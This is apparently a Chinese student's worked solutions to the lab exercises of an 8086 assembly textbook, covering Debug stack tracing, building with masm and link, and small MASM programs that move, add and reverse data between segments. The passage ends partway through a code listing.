<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, ffff</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2200</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">1000</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,[<span class="number">0</span>]  <span class="comment">;ax = _____</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>,[<span class="number">2</span>]  <span class="comment">;ax = _____</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,[<span class="number">4</span>]  <span class="comment">;bx = _____</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>,[<span class="number">6</span>]  <span class="comment">;bx = _____</span></div><div class="line"></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span>     <span class="comment">;sp = _____ 修改的内存单元的地址是_____内容为_____</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">bx</span>     <span class="comment">;sp = _____ 修改的内存单元的地址是_____内容为_____</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span>      <span class="comment">;sp = _____ ax = _____</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span>      <span class="comment">;sp = _____ bx = _____</span></div><div class="line"></div><div class="line"><span class="keyword">push</span> [<span class="number">4</span>]    <span class="comment">;sp = _____ 修改的内存单元的地址是_____内容为_____</span></div><div class="line"><span class="keyword">push</span> [<span class="number">6</span>]    <span class="comment">;sp = _____ 修改的内存单元的地址是_____内容为_____</span></div></pre></td></tr></table></figure>
<p>结果（不唯一）:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">D4EA</div><div class="line">25EE</div><div class="line"><span class="number">3002</span></div><div class="line">5F37</div><div class="line">00FE 220FE 25EE</div><div class="line">00FC 220FC 5F37</div><div class="line">00FE 5F37</div><div class="line"><span class="number">0100</span> 25EE</div><div class="line">00FE 220FE <span class="number">3002</span></div><div class="line">00FC 220FC 2F35</div></pre></td></tr></table></figure>
</li>
<li><p>仔细观察图3.19中的实验过程，然后分析：为什么2000:0～2000:f中的内容会发生改变？<br>在使用T命令进行单步追踪的时候，产生了中断，为了保护现场，CPU将PSW、CS和IP依此入栈，导致了内存相关位置内容的改变。</p>
</li>
</ol>
<h2 id="实验3-编程、编译、连接、跟踪"><a href="#实验3-编程、编译、连接、跟踪" class="headerlink" title="实验3 编程、编译、连接、跟踪"></a>实验3 编程、编译、连接、跟踪</h2><ol>
<li><p>将下面的程序保存为t1.asm文件，将其生成可执行文件t1.exe。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</div><div class="line"></div><div class="line">codesg <span class="meta">segment</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">0</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">sp</span>, <span class="number">10</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">codesg ends</div><div class="line"></div><div class="line">end</div></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">edit t1.asm</div><div class="line">masm.exe t1.asm;</div><div class="line">link.exe t1.obj;</div></pre></td></tr></table></figure>
</li>
<li><p>用Debug跟踪t1.exe的执行过程，写出每一步执行后，相关寄存器中的内容和栈顶的内容。<br><table><thead><tr><th style="text-align: center">汇编指令</th><th style="text-align: center">相关寄存器的内容</th><th style="text-align: center">栈顶的内容</th></tr></thead><tbody><tr><td style="text-align: center">mov ax, 2000H</td><td style="text-align: center">AX = 2000H</td><td style="text-align: center">00B8H</td></tr><tr><td style="text-align: center">mov ss, ax</td><td style="text-align: center">SS = 2000H</td><td style="text-align: center">&#95;&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">mov sp, 0</td><td style="text-align: center">SP = 0</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">add sp, 10</td><td style="text-align: center">SP = 10</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">pop ax</td><td style="text-align: center">AX = 0 SP = 12</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">pop bx</td><td style="text-align: center">BX = 0 SP = 14</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">push ax</td><td style="text-align: center">SP = 12</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">push bx</td><td style="text-align: center">SP = 10</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">pop ax</td><td style="text-align: center">AX = 0 SP = 12</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">pop bx</td><td style="text-align: center">BX = 0 SP = 14</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">mov ax, 4c00h</td><td style="text-align: center">AX = 4C00H</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">int 21h</td><td style="text-align: center">&#95;&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;&#95;</td></tr></tbody></table><br>结果不唯一</p>
</li>
<li><p>PSP的头两个字节是CD 20，用Debug加载t1.exe，查看PSP的内容。</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-d <span class="number">2119</span>:<span class="number">0</span></div></pre></td></tr></table></figure>
<p>2119为CS-0010H</p>
</li>
</ol>
<h2 id="实验4-bx-和loop的使用"><a href="#实验4-bx-和loop的使用" class="headerlink" title="实验4 [bx]和loop的使用"></a>实验4 [bx]和loop的使用</h2><ol>
<li><p>编程，向内存0:200～0:23F依此传送数据0～63（3FH）。</p>
</li>
<li><p>编程，向内存0:200～0:23F依此传送数据0～63（3FH），程序中只能使用9条指令，9条指令中包括“mov ax, 4c00h”和“int 21h”。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0020h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">64</span></div><div class="line"><span class="symbol"></span></div><div class="line">s:      <span class="keyword">mov</span> [<span class="built_in">bx</span>], <span class="built_in">bl</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">bl</span></div><div class="line"><span class="keyword">loop</span> s</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line">end</div></pre></td></tr></table></figure>
</li>
<li><p>下面的程序的功能是将“mov ax, 4c00h”之前的指令复制到内存的0:200处，补全程序，上机调试，跟踪运行结果。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, _____</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0020h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, _____</div><div class="line"><span class="symbol">s:</span>      <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">al</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">loop</span> s</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line">end</div></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">code</div><div class="line"><span class="number">18H</span></div></pre></td></tr></table></figure>
<p>提示：<br>复制的是什么？从哪里到哪里？<br>复制的是代码段中mov ax, 4c00h之前的代码，以数据的形式，从内存中代码段的位置复制到内存中0:200处开始的一段连续的空间。<br>复制的是什么？有多少个字节？你如何直到要复制的字节的数量？<br>可以用offset计算得出，也可以在Debug中用T命令观察得出。</p>
</li>
</ol>
<h2 id="实验5-编写、调试具有多个段的程序"><a href="#实验5-编写、调试具有多个段的程序" class="headerlink" title="实验5 编写、调试具有多个段的程序"></a>实验5 编写、调试具有多个段的程序</h2><ol>
<li><p>将下面的程序编译连接，用Debug加载、跟踪，然后回答问题。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ds</span>:data, <span class="built_in">ss</span>:stack</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span>, <span class="number">0789h</span>, <span class="number">0abch</span>, <span class="number">0defh</span>, <span class="number">0fedh</span>, <span class="number">0cbah</span>, <span class="number">0987h</span></div><div class="line">data ends</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></div><div class="line">stack ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"></div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
<p>①CPU执行程序，程序返回前，data段中的数据为多少？<br>②CPU执行程序，程序返回前，CS = _____、SS = _____、DS = _____。<br>③设程序加载后，code段的段地址为X，则data段的段地址为_____，stack段的段地址为_____。<br>答案：<br>①data段中的数据不变。<br>②212B、212A、2129（答案不唯一）<br>③X-2、X-1</p>
</li>
<li><p>将下面的程序编译连接，用Debug加载、跟踪，然后回答问题。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ds</span>:data, <span class="built_in">ss</span>:stack</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span></div><div class="line">data ends</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span></div><div class="line">stack ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"></div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
<p>(1)CPU执行程序，程序返回前，data段中的数据为多少？<br>(2)CPU执行程序，程序返回前，CS = _____、SS = _____、DS = _____。<br>(3)设程序加载后，code段的段地址为X，则data段的段地址为_____，stack段的段地址为_____。<br>(4)对于如下定义的段：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">name <span class="meta">segment</span></div><div class="line">...</div><div class="line"><span class="meta">segment</span> ends</div></pre></td></tr></table></figure>
<p>如果段中的数据占N个字节，则程序加载后，该段实际占有的空间为_____。<br>答案：<br>(1)data段中的数据不变。<br>(2)212B、212A、2129（答案不唯一）<br>(3)X-2、X-1<br>(4)((N-1)/16 + 1)*16 其中除法为整除</p>
</li>
<li><p>将下面的程序编译连接，用Debug加载、跟踪，然后回答问题。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ds</span>:data, <span class="built_in">ss</span>:stack</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"></div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span></div><div class="line">data ends</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span></div><div class="line">stack ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
<p>(1)CPU执行程序，程序返回前，data段中的数据为多少？<br>(2)CPU执行程序，程序返回前，CS = _____、SS = _____、DS = _____。<br>(3)设程序加载后，code段的段地址为X，则data段的段地址为_____，stack段的段地址为_____。<br>答案：<br>(1)data段中的数据不变。<br>(2)2129、212D、212C（答案不唯一）<br>(3)X+3、X+4</p>
</li>
<li><p>如果将1. 2. 3.题中的最后一条伪指令“end start”改为“end”（也就是说，不指明程序的入口），则哪个程序仍然可以正确执行？请说明原因。<br>答案：<br>只有程序3可以正确运行，在不指明程序入口的情况下，程序默认按照顺序从头开始执行，而3个程序中只有程序3的code段位于最开始的部分，所以只有程序3可以正确运行。</p>
</li>
<li><p>程序如下，编写code段中的代码，将a段和b段中的数据依此相加，将结果存到c段中。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line">a <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></div><div class="line">a ends</div><div class="line"></div><div class="line">b <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></div><div class="line">b ends</div><div class="line"></div><div class="line">c <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></div><div class="line">c ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span></div><div class="line">?</div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
<p>答案：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, a</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, b</div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, c</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></div><div class="line"><span class="symbol">s:</span>      <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span>]</div><div class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="built_in">es</span>:[<span class="built_in">bx</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>:[<span class="built_in">bx</span>], <span class="built_in">al</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">loop</span> s</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div></pre></td></tr></table></figure>
</li>
<li><p>程序如下，编写code段中的代码，用push指令将a段中的前8个字型数据，逆序存储到b段中。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">a <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0ah</span>, <span class="number">0bh</span>, <span class="number">0ch</span>, <span class="number">0dh</span>, <span class="number">0eh</span>, <span class="number">0fh</span>, <span class="number">0ffh</span></div><div class="line">a ends</div><div class="line"></div><div class="line">b <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></div><div class="line">b ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  </div><div class="line">?</div><div class="line">code ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
<p>答案：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, b</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, a</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></div><div class="line"><span class="symbol">s:</span>      <span class="keyword">push</span> [<span class="built_in">bx</span>]</div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line"><span class="keyword">loop</span> s</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="实验6-实践课程中的程序"><a href="#实验6-实践课程中的程序" class="headerlink" title="实验6 实践课程中的程序"></a>实验6 实践课程中的程序</h2><ol>
<li><p>将课程中所有讲解过的程序上机调试，用Debug跟踪其执行过程，并在过程中进一步理解所讲内容。</p>
</li>
<li><p>编程，完成问题7.9中的程序。<br>程序如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg, <span class="built_in">ss</span>:stacksg, <span class="built_in">ds</span>:datasg</div><div class="line">stacksg <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></div><div class="line">stacksg ends</div><div class="line"></div><div class="line">datasg <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="string">'1. display      '</span></div><div class="line"><span class="built_in">db</span> <span class="string">'2. brows        '</span></div><div class="line"><span class="built_in">db</span> <span class="string">'3. replace      '</span></div><div class="line"><span class="built_in">db</span> <span class="string">'4. modify       '</span></div><div class="line">datasg ends</div><div class="line"></div><div class="line">codesg <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, datasg</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, stacksg</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">4</span></div><div class="line"><span class="symbol">s:</span>      <span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">4</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="symbol">s0:</span>     <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span> + <span class="built_in">si</span> + <span class="number">3</span>]</div><div 